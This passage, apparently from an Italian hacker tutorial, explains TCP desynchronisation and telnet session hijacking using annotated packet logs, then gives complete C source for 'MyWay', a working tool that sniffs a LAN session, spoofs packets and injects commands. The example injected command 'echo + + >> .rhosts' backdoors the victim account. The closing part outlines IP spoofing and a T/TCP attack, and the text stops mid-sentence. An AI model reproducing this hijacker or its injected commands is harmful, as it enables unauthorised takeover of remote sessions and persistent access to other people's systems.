192.168.1.1:1025 > 192.168.1.2:23	SEQ:1118358534 ACK:4143819246
(TTL:64 Window:32120)			FLAGS: ----A-

Dopo e' il server a trasmettere dati. Possiamo vedere che il suo SEQ non
e' cambiato. Il client risponde con un ACK che riconosce 12 byte di dati.

Ho parlato dello stato ESTABLISHED. Questi stati sono comuni a tutte le
implementazioni TCP/IP. Essi sono definiti in <linux/tcp.h> :

enum {
  TCP_ESTABLISHED = 1,
  TCP_SYN_SENT,
  TCP_SYN_RECV,
  TCP_FIN_WAIT1,
  TCP_FIN_WAIT2,
  TCP_TIME_WAIT,
  TCP_CLOSE,
  TCP_CLOSE_WAIT,
  TCP_LAST_ACK,
  TCP_LISTEN,
  TCP_CLOSING   /* now a valid state */
};

Come possiamo desincronizzare lo stato della connessione ? I metodi
utilizzabili sono essenzialmente tre:

- A meta' del completamento del 3-way handshake (subito dopo l'invio da
parte del server del SYN/ACK) inviamo da parte del client un pacchetto con
flag RST ed avviamo una nuova richiesta con un nuovo ISN. Il server
aggiornera' il proprio ACK e rispondera' con un nuovo ISN. A questo punto
rispondiamo con un ACK all'ISN del server. Il vero client sara' ancora
nello stato ESTABLISHED dopo il primo e legale SYN/ACK del server, ma
sara' 'scoordinato' rispetto al nuovo ISN del server.

- Inviamo dei dati al server, DOPO che la connessione e' stata gia'
stabilita, in modo da portare avanti l'ACK del server. Cosi' facendo il
client non sara' in grado di fornire il SEQ corretto e sara' desincronizzato
rispetto al server. A questo punto abbiamo due possibilita': rimanere o
meno occultati. Mi spiego. Il server continuera' a rispondere ai tentativi
del vero client con il SEQ/ACK che aspetta. Il client fara' lo stesso.
Possiamo lasciare che la loro connessione si blocchi (spesso puo' succedere
comunque per motivi di lag e porta ad un nuovo tentativo da parte dell'utente)
oppure possiamo agire come negli attacchi del tipo 'man in the middle'.
Ovvero possiamo 'tradurre' e smistare coi rispettivi numeri esatti i
pacchetti sia per il client che per il server, ovviamente mentre inseriamo
i nostri stessi dati, filtrandone l'output agli occhi del client.

- Possiamo interrompere agli occhi del client la connessione utilizzando il
sistema dei vari nuker su IRC: inviando al sottosistema TCP del client dei
messaggi ICMP di tipo HOST_UNREACH o PORT_UNREACH mentre ci impossessiamo
del flusso della connessione. Questo metodo e' pero' il piu' visibile in
quanto porta a caduta vera e propria della connessione del client.

Una volta desincronizzata la connessione, potremo valutare il nuovo stato
di SEQ/ACK del server ed inviare i nostri dati. Dopodiche' potremo
interrompere la connessione, con un RST o con un FIN seguito da un ACK del
FIN del server.

Proviamo a vedere come si presenta un log di rete in presenza di un
attacco di questo tipo. Abbiamo una connessione dal sistema 192.168.1.2 al
sistema 192.168.1.1 sulla porta 23. Camuffandoci per il client .1.2
interrompiamo la loro connessione ed inseriamo i nostri comandi che
verranno prontamente eseguiti dal server =;) :

192.168.1.2:1025 > 192.168.1.1:23	SEQ:3985943535 ACK:0
(TTL:64 Window:512)			FLAGS: -S----

192.168.1.1:23 > 192.168.1.2:1025	SEQ:1000734102 ACK:3985943536
(TTL:64 Window:32736)			FLAGS: -S--A-

192.168.1.2:1025 > 192.168.1.1:23	SEQ:3985943536 ACK:1000734103
(TTL:64 Window:32120)			FLAGS: ----A-

Client e server entrano nello stato ESTABLISHED. Tralascio le opzioni di
negoziazione del terminale proprie di Telnet.

(... opzioni telnet ...)

192.168.1.1:23 > 192.168.1.2:1025	SEQ:1000734151 ACK:3985943609
(TTL:64 Window:32736)			FLAGS: ---PA-

192.168.1.2:1025 > 192.168.1.1:23	SEQ:3985943609 ACK:1000734285
(TTL:64 Window:32120)			FLAGS: ---PA-

192.168.1.1:23 > 192.168.1.2:1025	SEQ:1000734285 ACK:3985943612
(TTL:64 Window:32736)			FLAGS: ----A-

192.168.1.1:23 > 192.168.1.2:1025	SEQ:1000734285 ACK:3985943612
(TTL:64 Window:32736)			FLAGS: ---PA-
DATA ->		login: 

Siamo arrivati al prompt della connessione. Ora tralascio le procedure di
login, ed arriviamo direttamente alla shell:

192.168.1.1:23 > 192.168.1.2:1025	SEQ:1000734311 ACK:3985943629
(TTL:64 Window:32736)			FLAGS: ---PA-
DATA ->		Last login: Wed Sep 16 11:51:08 on tty2

192.168.1.2:1025 > 192.168.1.1:23	SEQ:3985943629 ACK:1000734352
(TTL:64 Window:32120)			FLAGS: ----A-
DATA ->		

(... motd ...)

192.168.1.1:23 > 192.168.1.2:1025	SEQ:1000734899 ACK:3985943629
(TTL:64 Window:32736)			FLAGS: ---PA-
DATA ->		[fusys@BFI_98 fusys]$ 

Qui vediamo che ogni dato trasmesso viene sempre accolto con un ACK. Ora
entra in gioco il codice per l'HIJACKING. Questo ha bisogno di un singolo
pacchetto in transito per catturare la coppia SEQ/ACK del server.
Aspettiamo quindi che l'utente digiti UN carattere (questo ovviamente va
ottimizzato per non dare nell'occhio, oppure va iniziato prima quando e'
il server a trasmettere): 'l'.

192.168.1.2:1025 > 192.168.1.1:23	SEQ:3985943629 ACK:1000734921
(TTL:64 Window:32120)			FLAGS: ----A-

192.168.1.2:1025 > 192.168.1.1:23	SEQ:3985943629 ACK:1000734921
(TTL:64 Window:32120)			FLAGS: ---PA-
DATA ->		l

I pacchetti spoofati sono contrassegnati qui da una window di soli 255
byte per renderli piu' visibili:

192.168.1.2:1025 > 192.168.1.1:23	SEQ:3985943630 ACK:1000734921
(TTL:255 Window:255)			FLAGS: ---PA-

192.168.1.2:1025 > 192.168.1.1:23	SEQ:3985943630 ACK:1000734921
(TTL:255 Window:255)			FLAGS: ---PA-

Qui abbiamo inserito dei backspace e degli enter. PER CANCELLARE CIO' CHE
L'UTENTE STAVA SCRIVENDO NELLA SHELL. 

192.168.1.1:23 > 192.168.1.2:1025	SEQ:1000734921 ACK:3985943638
(TTL:64 Window:32736)			FLAGS: ---PA-
DATA ->		l

192.168.1.2:1025 > 192.168.1.1:23	SEQ:3985943629 ACK:1000734921
(TTL:64 Window:32120)			FLAGS: ---PA-
DATA ->		l

192.168.1.1:23 > 192.168.1.2:1025	SEQ:1000734922 ACK:3985943638
(TTL:64 Window:32736)			FLAGS: ----A-

192.168.1.1:23 > 192.168.1.2:1025	SEQ:1000734921 ACK:3985943638
(TTL:64 Window:32736)			FLAGS: ---PA-
DATA ->		l

192.168.1.2:1025 > 192.168.1.1:23	SEQ:3985943629 ACK:1000734921
(TTL:64 Window:32120)			FLAGS: ---PA-
DATA ->		l

Qui vediamo che il client tenta di ritrasmettere il proprio carattere
comunicando la coppia SEQ/ACK da esso effettivamente attesa, non sapendo
infatti che abbiamo aggiunto altri dati oltre ai suoi(abbiamo ovvero
cancellato il suo carattere e siamo andati a capo). Il server da parte sua
comunica invece il suo stato al client. Questo ci serve per poter vedere
il suo ACK ed inserire altri pacchetti di conseguenza.

192.168.1.1:23 > 192.168.1.2:1025	SEQ:1000734922 ACK:3985943638
(TTL:64 Window:32736)			FLAGS: ----A-

192.168.1.1:23 > 192.168.1.2:1025	SEQ:1000734921 ACK:3985943638
(TTL:64 Window:32736)			FLAGS: ---PA-
DATA ->		l

192.168.1.2:1025 > 192.168.1.1:23	SEQ:3985943638 ACK:1000734922
(TTL:255 Window:255)			FLAGS: ---PA-
DATA ->		echo + + >> .rhosts

192.168.1.1:23 > 192.168.1.2:1025	SEQ:1000734922 ACK:3985943659
(TTL:64 Window:32715)			FLAGS: ---PA-
DATA ->		 
[fusys@BFI_98 fusys]$ 
[fusys@BFI_98 fusys]$ 

Finalmente siamo stati in grado di inserire il nostro comando, che viene
poi riconosciuto dal server e accolto dall' ACK esatto.

192.168.1.2:1025 > 192.168.1.1:23	SEQ:3985943630 ACK:1000734921
(TTL:64 Window:32120)			FLAGS: F---A-
DATA ->		l

Abbastanza esausto, il vero client vuole interrompere la connessione, ma
il suo SEQ e' ancora fuori sincronia ed e' per questo che il suo stato
rimarra' di FIN_WAIT1, in attesa di risposta dal server, che non puo'
arrivare. Dopo che sara' passato il tempo 2MSL (leggetevi gli RFC per
maggiori info su TCP) la connessione verra' comunque cestinata dal kernel.

Vediamo cosa aspettarci dall'output del codice.

/===========================================\
  MyWay - SiMPLE TELNET HiJACKER - by FuSyS
|-------------------------------------------|
          LET'S THE HiJACK BEGiN !
\===========================================/

<-------------------------------->
 PHASE #1 : TELNET SNiFF'n'DESyNC
<-------------------------------->

>>> Sniffing the Telnet Sessi0n <<<
xxxxx:1026 > xxxxx:23 SEQ:FE7EAAF3 (hex) ACK:F272EA8E (hex)

>>> Sp00fing t0 Desync <<<
Sending TCP packet with SEQ FE7EAAF5 ACK F272EA8E FLAGS:ACK|PSH

>>> Waiting f0r Desync_C0nfirm <<<
### Phase #1 0K. ###

<------------------------------------>
 PHASE #2 - GETTiNG SYN/ACK 0NCE M0RE
<------------------------------------>
Server SEQ: F272EA90 (hex)      ACK: FE7EAAFD (hex)
### Phase #2 0K. ###

<------------------------>
 PHASE #3 - SEND 0UR DATA
<------------------------>
>>> Injecting Evil Data in the TCP Stream <<<

>>> Waiting for C0nfirm <<<
### Phase #3 0K. ###

MyWay e' un semplice Telnet Hijacker. Semplice per alcuni motivi:

1) non si nasconde agli occhi del client piu' di tanto, fa morire la sua
connessione lasciandolo in FIN_WAIT1 ...

2) non agisce da man_in_the_middle : potrebbe ad esempio mantenere client
e server in un'illusione di connessione

3) non permette l'invio interattivo di comandi

Vi sento gia' dire: "Ah, vabbe, allora non vale nulla ...". In realta'
vale molto ... per i primi due punti questo puo' non servire quando si
attaccano sistemi multiutente con utenti inesperti. Cominciate a chiedervi
quante di quelle volte in cui avete chiuso una connessione, perche' da voi
ritenuta troppo lenta, in realta' non fossero degli hijack :ppppp

E non sempre conviene eseguire molti comandi ... questi COMPARIRANNO nella
history della shell. D'altronde per il server e' come se fosse stato il
client a darli !!!! Questo e' il potere dell'iP SPOOFiNG =;)

Oltretutto e' codato appositamente per attaccare server Telnet. Mentre
l'idea e' valida per ogni servizio il codice non lo e'. D'altronde ....
solo questo ho intenzione di rendere pubblico. Se siete in grado saprete
aggiungere quanto manca. Non e' poi difficile.

Ecco il codice: nessuna spiegazione qui. Per saltare da lama a newbie
qualcosa bisogna pur fare ...

------------------------ taglia qui --------------------------------------

/************************************************************************
* MyWay.c	      A Simple Telnet Session Hijacker. This tool gives *
*		      you the ability to redirect cmds to the server by *
*		      impersonating the	real client. Manipulating the	*  
*		      SYN/ACK sequences, we can desyncronize the client * 
*		      host and go on with the server by means of simple *
*		      IP Spoofing. Simple as we do NOT need to exploit  *
*		      ISN prediction, as long as the telnet connection  *
*		      goes by our LAN.					*
*									*
* N0TE:		      This is NOT trust relationship exploit, as noted  *
*		      in Phrack and most other tools. We just inoculate *
*		      cmds in a living connection, in the ESTABLISHED   *
*		      state. This can compromise OneTime pwds or S/Key  *
*		      links, Kerberos or any other authentication which *
*		      is not based upon encryption of the data stream.  *
*                                                                       *
* PAPER:	      A Simple Attive Attack Against TCP[Joncheray1995] *
*                                                                       *
* TNX:		      coder@reptile for his papers, code and a nice     *
*		      chat at HIP97. Oh, and for Sniffit, obviously =;)	*
*                     I took from his code and this is my credit ! 	*
*									*
*				NO(C)1998 FuSyS TCP/IP Tools Unlimited  *
************************************************************************/

/************************************************************************
* USAGE:	      	Well ... one of these MUST APPLY :		*
*			1) you got it with the companion text.		*
*			2) I know you can easily read the source.	*
*			Else, WHERE DiD Y0U GET THiS T00L ?!		*
*			Probably you've got N0 RiGHT to use it =:)	* 
************************************************************************/

#include <netdb.h>
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <errno.h>
#include <linux/in.h>
#include <linux/ip.h>
#include <linux/if.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <signal.h>
#include <fcntl.h>

#define MTU             	1500
#define IP_VERSION		4
#define IP_HEAD_BASE    	20             
#define TCP_HEAD_BASE   	20               
#define INTERFACE		"eth0"		/* 14 for eth0 */
#define INTERFACE_PREFIX	14		/* 0 for ppp0 */
#define MY_COUNT		666
#define URG 			32
#define ACK 			16
#define PSH 			8
#define RST 			4
#define SYN 			2
#define FIN 			1

int DEV_PREFIX ;
sig_atomic_t WAIT_PACKET_WAIT_TIME = 0 ;
int fd_rec, fd_send ;
char CLIENT[100], SERVER[100] ;
int CLIENT_PORT ;

struct wait_packet
{
        unsigned long seq,ack;
        unsigned short flags;
        unsigned short source_p, dest_p;
        int datalen;
};

struct IPhdr                        
{
        unsigned char verlen, type;
        unsigned short tot_len, ID, flag_offset;
        unsigned char TTL, protocol;
        unsigned short checksum;
        unsigned long int saddr, daddr;
};

struct TCPhdr                     
{
        unsigned short source, dest;
        unsigned long int seq, ack_seq;
        unsigned short offset_flag, window, checksum, urgent;
};

struct pseudoIP
{
        unsigned long int source, dest;
        char zero_byte, protocol;
        unsigned short TCP_UDP_len;
};


int if_init(char *device)
{
	int if_fd;
	struct ifreq netif;
	char test;
	if ((if_fd = socket(AF_INET, SOCK_PACKET, htons(0x3)))==-1) {
        	perror("Can't Open PACKET SOCKET.");
		exit(1);
	}
	strcpy(netif.ifr_ifrn.ifrn_name,device);
	if(ioctl(if_fd,SIOCGIFFLAGS,&netif)<0) {
        	perror("Can't Get Interface Flags.");
		exit(1);
	}
	netif.ifr_ifru.ifru_flags |= IFF_PROMISC;
	if(ioctl(if_fd,SIOCSIFFLAGS,&netif)<0) {
        	perror("Can't Set Interface Flag. (PROMISC)");
		exit(1);
	}
	if(fcntl(if_fd,F_SETOWN,getpid())<0) {
        	perror("Can't Set PACKET Ownership");
		exit(1);
	}
	return if_fd;
}

void ethclose()
{
        struct ifreq eth;
        strcpy(eth.ifr_ifrn.ifrn_name, INTERFACE);
        if ( ioctl(fd_rec, SIOCGIFFLAGS, &eth) < 0) {
                fprintf(stderr, "Can't get Ethernet flags.\n");
                exit(1);
        }
        eth.ifr_ifru.ifru_flags ^= IFF_PROMISC ;
        if ( ioctl(fd_rec, SIOCSIFFLAGS, &eth) < 0) {
                fprintf(stderr, "Can't put Ethernet in PROMISC mode.\n");
                exit(1);
        }
	exit(0);
}

int sniff_pk
(int sniff_fd, char *buffer, int *tcpstart, char *proto)
{
        struct IPhdr    *IP;
        char    sniff_buffer[1500];
        int pack_len;

        pack_len = read(sniff_fd, sniff_buffer, MTU);
        if (read > 0) {
                pack_len -=DEV_PREFIX;
                memcpy(buffer, sniff_buffer+DEV_PREFIX, pack_len);
		IP = (struct IPhdr *)buffer;
                if (proto != NULL) *proto = IP->protocol ;
		if(tcpstart != NULL)
                *tcpstart = (IP->verlen & 0xF) << 2;
        }
        return pack_len;
}

u_short in_cksum(u_short *ptr, int nbytes)
{
  register long           sum;            /* assumes long == 32 bits */
  u_short                 oddbyte;
  register u_short        answer;         /* assumes u_short == 16 bits */

  /*
   * Our algorithm is simple, using a 32-bit accumulator (sum),
   * we add sequential 16-bit words to it, and at the end, fold back
   * all the carry bits from the top 16 bits into the lower 16 bits.
   */

  sum = 0;
  while (nbytes > 1)
  {
    sum += *ptr++;
    nbytes -= 2;
  }

        /* mop up an odd byte, if necessary */
  if (nbytes == 1)
  {
    oddbyte = 0;            /* make sure top half is zero */
    *((u_char *) &oddbyte) = *(u_char *)ptr;   /* one byte only */
    sum += oddbyte;
  }

  /*
   * Add back carry outs from top 16 bits to low 16 bits.
   */

  sum  = (sum >> 16) + (sum & 0xffff);    /* add high-16 to low-16 */
  sum += (sum >> 16);                     /* add carry */
  answer = ~sum;          /* ones-complement, then truncate to 16 bits */

  return((u_short) answer);
}

u_long nameResolve(char *hostname)
{
  struct in_addr addr;
  struct hostent *hostEnt;

  if((addr.s_addr=inet_addr(hostname)) == -1)
  {
    if(!(hostEnt=gethostbyname(hostname)))
    {
        fprintf(stderr,"N0 SUCH H0ST:`%s`\n",hostname);
        exit(0);
    }
    bcopy(hostEnt->h_addr,(char *)&addr.s_addr,hostEnt->h_length);
  }
  return addr.s_addr;
}

/* from Spoofit by coder@reptile */
void wait_packet_timeout (int sig)
{
alarm(0);
WAIT_PACKET_WAIT_TIME=1;
}

int wait_pk(int fd,struct wait_packet *infoz,
                char *wp_source, unsigned short wp_source_port,
                char *wp_dest, unsigned short wp_dest_port, int wp_flags,
                int wait_time)
{
	char wp_buffer[1500];
	struct IPhdr *ip;
	struct TCPhdr *tcp;
	unsigned long sourcel, destl;
	int tcpstart;
	char proto;

	sourcel = nameResolve(wp_source);
	destl = nameResolve(wp_dest);

	WAIT_PACKET_WAIT_TIME=0;
	if(wait_time!=0) {
        	signal(SIGALRM,wait_packet_timeout);
        	alarm(wait_time);
        }

	while(1) {
  		while(sniff_pk(fd, wp_buffer, &tcpstart, &proto)<=0) {
        		if (WAIT_PACKET_WAIT_TIME!=0) {
				alarm(0);
				return -1;
			}
        	};
  	  if(proto == 6) {
    	 	ip= (struct IPhdr *) wp_buffer;
    		tcp= (struct TCPhdr *) (wp_buffer+tcpstart);
    		if((sourcel==ip->saddr) && (destl==ip->daddr)) {
      		    if(((ntohs(tcp->source)==wp_source_port)
		      || (wp_source_port==0)) &&
		      ((ntohs(tcp->dest)==wp_dest_port)
		      || (wp_dest_port==0))) {
        		if( (wp_flags==0) || (ntohs(tcp->offset_flag)&wp_flags))
          		{
       				infoz->source_p=ntohs(tcp->source);
       				infoz->dest_p=ntohs(tcp->dest);
       				infoz->seq=ntohl(tcp->seq);
       				infoz->ack=ntohl(tcp->ack_seq);
       				infoz->flags=ntohs(tcp->offset_flag)&
                                            (URG|ACK|PSH|FIN|RST|SYN);
       				infoz->datalen = ntohs(ip->tot_len) -
                       		((ip->verlen & 0xF) << 2) -
                       		((ntohs(tcp->offset_flag) & 0xF000) >> 10);
       				alarm(0);
       				return 0;
		        }
        	}
      	    }
        }
    }
}

void tx_tcp (int sp_fd, char *sp_data,int sp_ipoptlen, int sp_tcpoptlen,
		int sp_datalen, char *sp_source, unsigned short sp_source_port,
                char *sp_dest, unsigned short sp_dest_port, unsigned long
		sp_seq, unsigned long sp_ack, unsigned short sp_flags)
{
	char sp_buffer[1500];
	char pseudoconstruct[MTU];
	struct pseudoIP *pseudo;
	struct TCPhdr *newtcp;
	struct IPhdr *newip;
	int shooten;
	struct sockaddr_in target;

	bzero(sp_buffer,1500);
	if (sp_datalen!=0)
	memcpy(sp_buffer+IP_HEAD_BASE+TCP_HEAD_BASE+sp_ipoptlen+sp_tcpoptlen,
                        sp_data+sp_ipoptlen+sp_tcpoptlen,sp_datalen);

	newtcp=(struct TCPhdr *)(sp_buffer+IP_HEAD_BASE+sp_ipoptlen);
	pseudo=(struct pseudoIP *) pseudoconstruct;

	newtcp->offset_flag = htons( (((TCP_HEAD_BASE+sp_tcpoptlen)/4)<<12) | sp_flags);
	newtcp->seq = htonl(sp_seq);
	newtcp->ack_seq = htonl(sp_ack);
	newtcp->source = htons(sp_source_port);
	newtcp->dest = htons(sp_dest_port);
	newtcp->window = htons(0x7c00); 

	pseudo->source = nameResolve(sp_source);
	pseudo->dest = nameResolve(sp_dest);
	pseudo->zero_byte = 0;
	pseudo->protocol = 6;
	pseudo->TCP_UDP_len = htons(sp_datalen+TCP_HEAD_BASE+sp_tcpoptlen);

	memcpy(pseudoconstruct+12, newtcp, sp_tcpoptlen+sp_datalen+TCP_HEAD_BASE);
	newtcp->checksum=in_cksum((unsigned short *) pseudoconstruct, sp_datalen +
	12 + TCP_HEAD_BASE + sp_tcpoptlen);

	newip = (struct IPhdr *) (sp_buffer);
	newip->checksum=0;
	newip->verlen = (IP_VERSION << 4) | ((IP_HEAD_BASE+sp_ipoptlen)/4);
	newip->type = 0;
	newip->tot_len = htons(IP_HEAD_BASE + TCP_HEAD_BASE + sp_datalen
		+ sp_ipoptlen + sp_tcpoptlen);
	newip->ID = htons(12545);
	newip->flag_offset = 0;
	newip->TTL = 255;
	newip->protocol = IPPROTO_TCP;
	newip->saddr = nameResolve(sp_source);
	newip->daddr = nameResolve(sp_dest);
	newip->checksum=in_cksum((unsigned short *) (sp_buffer), IP_HEAD_BASE
			+ sp_ipoptlen);

	bzero((char *) &target, sizeof(struct sockaddr));
	target.sin_family = AF_INET;
	target.sin_addr.s_addr = nameResolve(sp_dest);

	shooten = sendto(sp_fd, (char *)(sp_buffer), sp_datalen + TCP_HEAD_BASE
	+ IP_HEAD_BASE + sp_ipoptlen, 0, (struct sockaddr *) &target, 
				sizeof(struct sockaddr));
	
}

int main(int argc, char **argv)
{
	int i, j, count, halt;
	struct wait_packet pk_info;
	unsigned long spoof_seq, spoof_ack;
	unsigned long old_seq, old_ack;
	unsigned long serv_seq, serv_ack;

	char cleaner[]={0x08,0x08,0x08,0x08,0x08,0x08,0x0a,0x0a};
	FILE *inject;
	char buff[200];
	int evil_i;
	char evil[200];	

	if(argc<5) {
		printf("\n\t/===========================================\\");
		printf("\n\t  MyWay - SiMPLE TELNET HiJACKER - by FuSyS\n");
		printf("\t|-------------------------------------------|\n");
		printf("\t  %s  CLiENT_H0ST  TCP_P0RT  TARGET\n", argv[0]);
		printf("\t\\===========================================/\n\n");
		exit(1);
	}

	strcpy(CLIENT, argv[1]);
	strcpy(SERVER, argv[3]);
	CLIENT_PORT=atoi(argv[2]);

	inject=fopen(argv[4], "r");
	if (inject == NULL) {
		printf("\nYEAH. RiGHT. WHERE'S THE DATA FiLE ?\n\n");
		exit(1);
	}

	DEV_PREFIX = INTERFACE_PREFIX ;
	if ((fd_send = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) <0 ) {
        	perror("Can't 0pen RAW S0CKETS ");
		exit(1);
	}
	fd_rec = if_init(INTERFACE);

	printf("\n/===========================================\\");
        printf("\n  MyWay - SiMPLE TELNET HiJACKER - by FuSyS\n");
	printf("|-------------------------------------------|\n");	
	printf("          LET'S THE HiJACK BEGiN !\n");
	printf("\\===========================================/\n\n");

	halt = 0;
	evil_i = 0;
	while (halt==0) {
		buff[0]=getc(inject);
		if (feof(inject) != 0) halt = 1;
		
		switch(buff[0]) {
			case '\\':
				buff[0]=getc(inject);
				buff[1]=getc(inject);
				buff[2]=getc(inject);
				buff[3]=getc(inject);
				evil[evil_i]=(unsigned char)strtol
						(buff, (char **)NULL, 0);
				evil_i++;
				break;
		
			default:
				evil[evil_i]=buff[0];
				evil_i++;
				break;
		}
	}
	for (j=0;j<50;j++) {
		printf("<-------------------------------->\n");
		printf(" PHASE #1 : TELNET SNiFF'n'DESyNC\n");
		printf("<-------------------------------->\n");

		wait_pk(fd_rec, &pk_info, CLIENT, CLIENT_PORT, SERVER, 
			23, ACK|PSH,0);
		spoof_seq=pk_info.seq + pk_info.datalen;
		spoof_ack=pk_info.ack;
		printf("\n>>> Sniffing the Telnet Sessi0n <<<\n");
		printf("%s:%i > %s:23 SEQ:%X (hex) ACK:%X (hex)\n", CLIENT,
			CLIENT_PORT, SERVER, pk_info.seq, pk_info.ack);
		printf("\n>>> Sp00fing t0 Desync <<<\n");
		printf("Sending TCP packet with SEQ %X ACK %X FLAGS:ACK|PSH",
			spoof_seq, spoof_ack);
		tx_tcp(fd_send, cleaner, 0, 0, sizeof(cleaner), CLIENT,
		CLIENT_PORT, SERVER, 23, spoof_seq, spoof_ack, ACK|PSH);
		count = 0;
		printf("\n\n>>> Waiting f0r Desync_C0nfirm <<<\n");
		while(count<5) {
			wait_pk(fd_rec, &pk_info, SERVER, 23, CLIENT,
				CLIENT_PORT, ACK,0);
			if(pk_info.ack==spoof_seq + sizeof(cleaner))
				count=MY_COUNT;
			else count++;
		}
		if(count!=MY_COUNT) {
			printf("\t<--------------------------------->\n");
			printf("\t PHASE #1 N0T SUCCEDED ... L00PiNG\n");
			printf("\t<--------------------------------->\n");
		}
		else { 
			printf("### Phase #1 0K. ###\n");
			break;
		}
	}

	printf("\n<------------------------------------>\n");
	printf(" PHASE #2 - GETTiNG SYN/ACK 0NCE M0RE\n");
	printf("<------------------------------------>\n");
	count = serv_seq = old_ack = 0;
	while(count<10) {
		old_seq = serv_seq;
		old_ack = serv_ack;
		wait_pk(fd_rec, &pk_info, SERVER, 23, CLIENT, CLIENT_PORT,
			ACK,0);
		if (pk_info.datalen == 0) {
			serv_seq=pk_info.seq + pk_info.datalen;
			serv_ack=pk_info.ack;
			if ((old_seq==serv_seq)&&(serv_ack==old_ack))
				count = MY_COUNT;
			else count++;
		}
	}
	if(count!=MY_COUNT) {
		printf("\t<-------------------------------->\n");
		printf("\t PHASE #2 NOT SUCCEDED. S0 L0NG !\n");
		printf("\t<-------------------------------->\n");
		exit(0);
	}
	printf("Server SEQ: %X (hex)\tACK: %X (hex)\n", serv_seq, serv_ack);
	printf("### Phase #2 0K. ###\n");

	printf("\n<------------------------>\n");
	printf(" PHASE #3 - SEND 0UR DATA\n");
	printf("<------------------------>\n");
	printf(">>> Injecting Evil Data in the TCP Stream <<<\n",evil);
	tx_tcp(fd_send, evil, 0, 0, evil_i, CLIENT, CLIENT_PORT,
		SERVER, 23, serv_ack, serv_seq, ACK|PSH);	
	count=0;
	printf("\n>>> Waiting for C0nfirm <<<\n");
	while(count<5) {
		wait_pk(fd_rec, &pk_info, SERVER, 23, CLIENT, CLIENT_PORT,
			ACK,0);
		if(pk_info.ack==serv_ack+evil_i)
			count=MY_COUNT;
		else count++;
	}
	if (count!=MY_COUNT) {
		printf("\t<--------------------->\n");
		printf("\t PHASE #3 N0T SUCCEDED\n");
		printf("\t<--------------------->\n\n");
		exit(0);
	}
	printf("### Phase #3 0K. ###\n\n");
	ethclose();
	exit(0);
}

------------------------ taglia qui --------------------------------------

Questo codice puo' poi essere modificato leggermente, davvero poco, per
poter essere tramutato in una sorta piu' nobile: l'attacco di Morris,
modificato dalla possibilita' di ottenere con lo sniffer l'ISN del server.
In pratica una versione lite dell'iP SPOOFiNG cieco :)

Qui le idee si sprecano .... volete connettervi o inviare mail da host
INESISTENTI ? Collegarvi alle macchine della vostra rete simulando
connessioni dall'altra parte del globo ? Collegarvi al server IRC della 
vostra universita' con un bell'address spoofing ? Ora potete farlo ... 
Al solito, il limite e' la fantasia. [e l'intelligenza]

Ad esempio potrebbe venir fuori qualcosa del genere:

/===========================================\
  Morris Jr - SiMPLE iP SP00FER - by FuSyS
|-------------------------------------------|
          LET'S THE SP00F BEGiN !
\===========================================/

<-------------------------------->
   PHASE #1 : 0PENiNG TCP SP00F
<-------------------------------->

>>> TCP 3-way Handshake <<<

Sending First TCP Packet with ISN 1118358509 FLAGS:SYN
Target replied with ISN 4151130365 ACK 1118358510 FLAGS:SYN|ACK
Sending TCP packet with SEQ 1118358510 ACK 4151130366 FLAGS:ACK

### Phase #1 h0pefully 0K. ###

<------------------------>
 PHASE #2 - SEND 0UR DATA
<------------------------>
>>> Injecting Evil Data in the TCP Stream <<<

>>> Waiting for C0nfirm <<<

### Phase #2 0K. ###


------[ T / T C P  S P O O F I N G ]------

Ora voglio mostrarvi come sia possibile, in alcuni casi, effettuare il
vero attacco di Morris senza dover far fronte a tutti i problemi connessi
alla predizione dell'ISN del server [che saranno invece parte del futuro
secondo capitolo di 0N0S3NDAi sullo spoof cieco].

Esiste un protocollo interamente retro-compatibile con TCP, che prende il
nome di T/TCP o TCP for Transactions. Esso e' stato ideato per far fronte
ai problemi di scarsa velocita' e stress di rete che TCP comporta.
Infatti, come si legge nell'RFC 793, TCP e' un compromesso tra affidabilita' 
e velocita', decisamente a sfavore di quest'ultima. Ecco perche' per
applicazioni client/server che necessitino di gran velocita' i coder tendono 
a sfruttare le caratteristiche di UDP, perdendo pero' nel controllo del
flusso della connessione.

T/TCP e' stato introdotto per offrire velocita' simili a quelle ottenibili
con UDP, pur mantenendo il controllo mediante flag e numeri di sequenza di
TCP. Come e' possibile ? Semplicemente introducendo due nuove funzioni:

- TAO o Tcp Accelerated Open

Questo serve per BYPASSARE il 3-way handshake di TCP. Funziona utilizzando
un unico identificatore: CC o Connection Count. T/TCP ne mantiene uno per
ogni connessione da uno specifico richiedente. Quando arriva un nuovo
pacchetto con flag SYN, se contiene un CC ed e' SUPERIORE all'ultimo CC
registrato da T/TCP, allora il test TAO e' considerato superato e la
connessione procede senza scambio di ACK sugli ISN. Ovviamente la prima
volta non esiste alcun CC sul server e quindi bisognera' completare almeno
una volta l'handshake normale a tre vie.

T/TCP specifica 3 nuove opzioni TCP: CC, appunto, CCnew e CCecho. CCnew
puo' solo essere associato alla flag SYN di un client che voglia
reinizializzare il CC del server ed eseguire un handshake a 3 vie. CCecho
puo' essere associato solo alla risposta SYN/ACK del server per informare
di capire T/TCP, ed e' l'echo del CC o CCnew del client.

Queste nuove opzioni richiedono la presenza nel kernel di nuove
informazioni. 

tcp_cgen e' un intero a 32 bit contenente il prossimo valore di CC da
usare. Viene incrementato di 1 per ogni connessione TCP stabilita, attiva
o passiva. Non e' mai uguale a 0.

tao_cc e' l'ultimo CC ricevuto con un SYN senza ACK, quindi una apertura
attiva. Quando T/TCP riceve un nuovo pacchetto con flag SYN con l'opzione
CC maggiore del valore in tao_cc, allora il test TAO e' superato e la
connessione non esegue il 3-way handshake.

- Chiusura precoce dello stato TIMEWAIT 

Quando una connessione TCP termina, devono comunque essere mantenute
informazioni di stato per almeno il doppio del massimo tempo di
sopravvivenza dei pacchetti o 2MSL, Maximum Segment Lifetime, che di
solito varia per tutte le implementazioni tra 60 e 240 secondi. Questo
tempo dovrebbe essere sufficiente perche' ogni istanza dei pacchetti
trasmessi in una connessione sia persa. Ed in effetti lo e'. Purtroppo,
per la caratteristica intrinseca delle porte TCP, queste non sono
infinite. Questo, insieme alla durata del TIMEWAIT puo' portare ad
esaurimento delle capacita' di risposta di un sistema. T/TCP puo' ridurre
lo stato TIMEWAIT fino a 8 secondi, facendo uso del CC per distinguere
pacchetti ritrasmessi o obsoleti.

T/TCP ATTACK !

E' ora chiaro come si possa attaccare un host che faccia uso di T/TCP
senza che ci sia l'annoso problema di predire l'ISN. Semplicemente inviamo
